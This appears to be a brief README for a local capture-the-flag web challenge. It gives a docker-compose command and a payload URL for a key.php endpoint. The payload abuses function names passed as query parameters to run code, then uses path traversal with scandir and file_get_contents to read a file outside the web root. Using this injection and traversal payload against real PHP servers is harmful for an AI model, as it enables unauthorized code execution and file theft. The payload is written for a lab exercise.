# Day1 web 1

Use
```
docker-compose up -d
```

Access localhost:8088


payload
```
http://127.0.0.1:8088/key/key.php?f=var_dump&b=system&c=var_dump(file_get_contents("../../../../".scandir("../../../../")[7]));
```
